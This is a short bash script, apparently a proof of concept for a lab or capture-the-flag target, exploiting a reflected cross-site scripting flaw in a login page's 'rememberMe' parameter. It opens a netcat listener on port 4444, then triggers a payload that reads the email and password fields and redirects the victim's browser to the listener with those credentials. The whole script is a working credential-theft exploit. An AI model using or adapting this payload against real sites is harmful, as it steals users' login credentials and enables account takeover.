#!/bin/bash
set -m

nc -lvp 4444 &

ip=`ip a | awk '/docker0/ && /inet/ {print $2}' | cut -d '/' -f 1`

./emulate.sh 'http://localhost/Identity/Login?rememberMe=setTimeout(function(){location%3d`http://'$ip':4444?x=${document.getElementById(`Data_Email`).value}:${document.getElementById(`Data_Password`).value}`},`2000`)'

fg